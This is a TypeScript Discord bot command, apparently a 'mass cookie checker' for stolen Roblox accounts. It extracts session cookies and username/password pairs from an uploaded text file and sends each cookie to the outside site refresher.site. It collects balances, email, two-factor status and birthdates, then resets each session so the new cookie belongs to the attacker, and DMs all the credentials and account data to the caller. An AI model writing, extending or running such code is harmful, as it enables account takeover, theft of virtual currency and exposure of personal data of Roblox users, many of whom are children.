import {
  SlashCommandBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
  AttachmentBuilder,
  EmbedBuilder,
} from 'discord.js';
import axios from 'axios';
import * as Roblox from '../../lib/roblox-api';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

function sanitizeText(text: string): string {
  return text
    .replace(/â€“/g, '–')
    .replace(/â€/g, '-')
    .replace(/Ã©/g, 'é')
    .replace(/Ã¨/g, 'è')
    .replace(/Ã¢/g, 'â')
    .replace(/Ã™/g, '™')
    .replace(/ðŸ¡/g, '🏡')
    .replace(/ðŸŒ±/g, '🌱')
    .replace(/ðŸŒ¶ï¸/g, '🌶️')
    .replace(/ðŸ/g, '');
}

function plainSuccessEmbed(description: string, thumbnail?: string | null) {
  const embed = new EmbedBuilder()
    .setColor(0x57f287)
    .setDescription(description);
  if (thumbnail) embed.setThumbnail(thumbnail);
  return embed;
}

function plainErrorEmbed(description: string) {
  return new EmbedBuilder()
    .setColor(0xed4245)
    .setDescription(description);
}

function plainProgressEmbed(description: string) {
  return new EmbedBuilder()
    .setColor(0xfee75c)
    .setDescription(description);
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File (Auto‑Reset via Refresher.site)')
  .addAttachmentOption((opt) =>
    opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  const startTime = Date.now();

  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      await interaction.editReply({ embeds: [plainErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed');
      await interaction.editReply({ embeds: [plainErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      await interaction.editReply({ embeds: [plainErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain cookie tokens.')] });
      return;
    }

    await interaction.editReply({ embeds: [plainProgressEmbed(`Checking ${cookies.length} cookie(s) via Refresher.site...`)] });

    let validCount = 0;
    let invalidCount = 0;
    let totalRobux = 0;
    let totalPending = 0;
    let totalCredit = 0;
    let totalRAP = 0;
    let totalAnimations = 0;
    let totalLastPlayedGames = 0;
    let totalGamepassCount = 0;
    let totalGamepassSpent = 0;
    let totalPremium = 0;
    let totalIncoming = 0;
    let totalOutgoing = 0;

    const outputLines: string[] = [];

    const passwordMap = new Map<string, string>();
    const lines = fileContent.split(/\r?\n/);
    let currentUser = '';
    for (const line of lines) {
      const userMatch = line.match(/^Username:\s*(.+)/i);
      if (userMatch) currentUser = userMatch[1].trim();
      const passMatch = line.match(/^Password:\s*(.+)/i);
      if (passMatch && currentUser) {
        passwordMap.set(currentUser.toLowerCase(), passMatch[1].trim());
      }
    }

    for (const rawCookie of cookies) {
      try {
        const resp = await axios.post(
          'https://refresher.site/api/refresh',
          { cookie: rawCookie, getAccountInfo: true },
          {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
              'Content-Type': 'application/json',
              'Accept': 'application/json',
              'Origin': 'https://refresher.site',
              'Referer': 'https://refresher.site/',
            },
            timeout: 30000,
            validateStatus: () => true,
          }
        );

        if (resp.status !== 200 || !resp.data?.success || !resp.data?.account_info) {
          invalidCount++;
          continue;
        }

        const account: any = resp.data.account_info;
        validCount++;

        const username = sanitizeText(account.username || 'Unknown');
        const userId = String(account.userId || '');
        const password = passwordMap.get(username.toLowerCase()) || 'N/A';

        let summary = { incoming: 0, outgoing: 0 };
        try {
          summary = await Roblox.fetchTransactionTotals(rawCookie, userId);
        } catch {}

        totalIncoming += summary.incoming;
        totalOutgoing += Math.abs(summary.outgoing);

        const robux = account.robux ?? 0;
        const pending = account.robux_pending ?? 0;
        const credit = account.roblox_credit ?? 0;
        const rap = account.total_rap ?? 0;
        const premium = account.isPremium ? 'Yes' : 'No';
        const email = account.email_status === 'Verified' ? account.email_address || 'Verified' : account.email_status || 'None';
        const twoFactor = account.two_factor || 'None';
        const birthdate = sanitizeText(account.birthdate || 'Unknown');
        const ageGroup = sanitizeText(account.age_group || 'Unknown');
        const animations = account.animations ?? 0;
        const lastPlayedGamesList: string[] = account.last_played_games || [];
        const lastPlayedGames = lastPlayedGamesList.length;
        const continuePlaying: any[] = account.continue_playing || [];

        let gamepassCount = 0;
        let gamepassSpent = 0;
        for (const g of continuePlaying) {
          const purchases: any[] = g.purchases || [];
          for (const p of purchases) {
            if (p.type && p.type.includes('Game Pass')) {
              gamepassCount++;
              gamepassSpent += p.amount || 0;
            }
          }
        }

        totalRobux += robux;
        totalPending += pending;
        totalCredit += credit;
        totalRAP += rap;
        totalAnimations += animations;
        totalLastPlayedGames += lastPlayedGames;
        totalGamepassCount += gamepassCount;
        totalGamepassSpent += gamepassSpent;
        if (premium === 'Yes') totalPremium++;

        const resetResult = await Roblox.killAndRefreshSession(rawCookie);
        const newCookie = resetResult.success && resetResult.newCookie ? resetResult.newCookie : rawCookie;

        const embed = plainSuccessEmbed(
          `\`\`\`\n${newCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`,
          account.avatarUrl
        );

        try {
          await interaction.user.send({ embeds: [embed] });
        } catch {
          const chan = interaction.channel as any;
          if (chan && chan.send) await chan.send({ embeds: [embed] });
        }

        outputLines.push(`COOKIE #${validCount} - ${username}`);
        outputLines.push(`Username: ${username}`);
        outputLines.push(`Password: ${password}`);
        outputLines.push(`User ID: ${userId}`);
        outputLines.push(`Robux: ${robux}`);
        outputLines.push(`Premium: ${premium}`);
        outputLines.push(`Cookie: ${newCookie}`);
        outputLines.push(`Account Summary: Incoming ${summary.incoming} | Outgoing ${Math.abs(summary.outgoing)}`);
        outputLines.push(`Gamepass Spent: ${gamepassSpent}`);
        outputLines.push(`Gamepass Count: ${gamepassCount}`);
        outputLines.push(`Email: ${email}`);
        outputLines.push(`Birthdate: ${birthdate}`);
        outputLines.push(`Age Group: ${ageGroup}`);
        outputLines.push(`Two Factor: ${twoFactor}`);
        outputLines.push(`Total RAP: ${rap}`);
        outputLines.push(`Animations: ${animations}`);
        outputLines.push(`Pending Robux: ${pending}`);
        outputLines.push(`Roblox Credit: ${credit}`);
        outputLines.push(`Last Played Games: ${lastPlayedGamesList.join(' | ') || 'None'}`);
        outputLines.push('');
      } catch (err: any) {
        logger.error({ err, cookie: rawCookie.slice(0, 20) }, 'Refresher API error');
        invalidCount++;
      }
    }

    const totalCookies = cookies.length;
    const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(1);

    const summaryLines = [
      '===============',
      'Total Summary :',
      `Total Ingoing : ${totalIncoming}`,
      `Total Outgoing : ${totalOutgoing}`,
      `Total Robux : ${totalRobux}`,
      `Total Gamepass Spent : ${totalGamepassSpent}`,
      `Premium : ${totalPremium}`,
      `Gamepasses : ${totalGamepassCount}`,
      `Time Checked : ${elapsedSeconds}s`,
      '===============',
      ''
    ];

    const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const headerLines = [
      `VALID COOKIES - ${validCount} cookies`,
      '========================================',
      `Generated: ${now} UTC`,
      '========================================',
      ''
    ];

    const allOutput = [...headerLines, ...summaryLines, ...outputLines].join('\n').trim() || 'No valid cookies found.';
    const fileBuffer = Buffer.from(allOutput, 'utf-8');
    const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });

    const summaryEmbed = plainSuccessEmbed(
      `✧ **Results**\n────\n⭑ **Total Cookies:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Gamepass Spent:** ${totalGamepassSpent.toLocaleString()}\n⭑ **Total Premium:** ${totalPremium}\n⭑ **Time:** ${elapsedSeconds}s`
    );

    try {
      await interaction.user.send({
        embeds: [summaryEmbed],
        files: [fileAttachment],
      });
    } catch {
      const chan = interaction.channel as any;
      if (chan && chan.send) await chan.send({ embeds: [summaryEmbed], files: [fileAttachment] });
    }

    await interaction.editReply({ content: '✅ Results sent to your DMs.', embeds: [] });
  } catch (err: any) {
    logger.error({ err }, 'Check command error');
    try {
      await interaction.editReply({ embeds: [plainErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
    } catch {}
  }
}

async function handleButton(_interaction: MessageComponentInteraction): Promise<void> {
}

export const checkCommand: Command = { data, execute, handleButton };